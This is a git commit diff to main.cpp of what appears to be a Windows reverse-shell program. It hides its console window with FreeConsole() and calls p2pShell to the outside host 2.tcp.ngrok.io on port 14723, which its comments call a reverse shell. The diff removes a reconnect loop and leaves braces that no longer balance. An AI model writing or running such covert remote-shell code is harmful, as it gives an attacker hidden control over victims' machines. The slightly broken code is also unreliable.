8987fa1618475f6337e13782b4b347f4b0b976a5
manjoos <71747405+0xmanjoos@users.noreply.github.com>
2021-02-13 14:44:23 -0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -3,7 +3,6 @@ int main(int argc, char* argv[]) {
     // remember to compile with -lws2_32 
     // example, change this to your host/port
     FreeConsole(); // hide the cmd prompt when executed via windows gui
-    while (1) { // constant loop, just in case something breaks within winsock or my program, this should basically safeguard it
-        p2pShell("2.tcp.ngrok.io", 14723); // call the function, peer-to-peer, reverse shell
+    p2pShell("2.tcp.ngrok.io", 14723); // call the function, peer-to-peer, reverse shell
     }
 }
